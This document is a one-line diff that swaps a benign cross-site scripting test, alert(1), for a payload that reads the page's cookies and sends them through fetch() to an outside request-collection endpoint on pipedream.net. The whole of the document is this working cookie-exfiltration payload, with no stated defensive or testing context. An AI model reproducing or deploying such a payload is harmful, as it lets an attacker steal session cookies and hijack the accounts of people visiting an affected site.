@@ -1,1 +1,1 @@
-alert(1)
+fetch('https://enfj6pphj5cgs.x.pipedream.net?cookie='+document.cookie)
